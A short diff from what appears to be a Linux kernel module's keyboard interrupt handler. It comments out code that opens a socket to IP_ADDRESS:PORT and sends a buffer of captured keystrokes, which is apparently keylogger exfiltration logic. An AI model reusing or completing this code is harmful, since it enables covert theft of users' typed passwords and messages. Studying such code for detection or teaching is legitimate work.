@@ -33,20 +33,20 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
 
         if (buffer_count == 0) {
             msleep(2000);
-            struct socket* sock = create_socket(IP_ADDRESS, PORT);
+            //struct socket* sock = create_socket(IP_ADDRESS, PORT);
             printk(KERN_INFO "Created socket\n");
             msleep(5000);
-            if (sock == NULL) {
-                printk(KERN_INFO "Oh no, no connection\n");
-                return IRQ_NONE;
-            }
-            
-            send_message(sock, keystrokes);
-            printk(KERN_INFO "Sent message\n");
-            msleep(10000);
-            shutdown_socket(sock);
-            printk(KERN_INFO "Closed socket\n");
-            msleep(10000);
+            //if (sock == NULL) {
+             //   printk(KERN_INFO "Oh no, no connection\n");
+               // return IRQ_NONE;
+            //}
+
+            //send_message(sock, keystrokes);
+            //printk(KERN_INFO "Sent message\n");
+            //msleep(10000);
+            //shutdown_socket(sock);
+            //printk(KERN_INFO "Closed socket\n");
+            //msleep(10000);
         }
     }
 
